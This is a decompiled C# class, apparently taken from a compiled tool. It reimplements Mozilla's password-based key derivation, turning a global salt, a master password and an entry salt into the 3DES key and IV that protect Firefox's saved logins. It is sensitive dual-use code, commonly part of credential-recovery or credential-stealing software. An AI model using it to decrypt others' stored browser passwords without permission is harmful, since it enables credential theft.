using System;
using System.Security.Cryptography;

namespace Decrypt
{
	// Token: 0x02000041 RID: 65
	public class MozillaPBE
	{
		// Token: 0x17000044 RID: 68
		// (get) Token: 0x06000172 RID: 370 RVA: 0x00008122 File Offset: 0x00006322
		// (set) Token: 0x06000173 RID: 371 RVA: 0x0000812A File Offset: 0x0000632A
		private byte[] GlobalSalt { get; set; }

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x06000174 RID: 372 RVA: 0x00008133 File Offset: 0x00006333
		// (set) Token: 0x06000175 RID: 373 RVA: 0x0000813B File Offset: 0x0000633B
		private byte[] MasterPassword { get; set; }

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x06000176 RID: 374 RVA: 0x00008144 File Offset: 0x00006344
		// (set) Token: 0x06000177 RID: 375 RVA: 0x0000814C File Offset: 0x0000634C
		private byte[] EntrySalt { get; set; }

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x06000178 RID: 376 RVA: 0x00008155 File Offset: 0x00006355
		// (set) Token: 0x06000179 RID: 377 RVA: 0x0000815D File Offset: 0x0000635D
		public byte[] Key { get; private set; }

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x0600017A RID: 378 RVA: 0x00008166 File Offset: 0x00006366
		// (set) Token: 0x0600017B RID: 379 RVA: 0x0000816E File Offset: 0x0000636E
		public byte[] IV { get; private set; }

		// Token: 0x0600017C RID: 380 RVA: 0x00008177 File Offset: 0x00006377
		public MozillaPBE(byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt)
		{
			this.GlobalSalt = GlobalSalt;
			this.MasterPassword = MasterPassword;
			this.EntrySalt = EntrySalt;
		}

		// Token: 0x0600017D RID: 381 RVA: 0x0000819C File Offset: 0x0000639C
		public void Compute()
		{
			SHA1 sha = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
			Array.Copy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
			Array.Copy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
			byte[] array2 = sha.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this.EntrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this.EntrySalt, 0, array3, array2.Length, this.EntrySalt.Length);
			byte[] key = sha.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this.EntrySalt, 0, array4, 0, this.EntrySalt.Length);
			for (int i = this.EntrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this.EntrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this.EntrySalt, 0, array5, array4.Length, this.EntrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this.EntrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this.EntrySalt, 0, array8, array7.Length, this.EntrySalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.Key = new byte[24];
			for (int j = 0; j < this.Key.Length; j++)
			{
				this.Key[j] = array10[j];
			}
			this.IV = new byte[8];
			int num = this.IV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.IV.Length; k--)
			{
				this.IV[num] = array10[k];
				num--;
			}
		}
	}
}
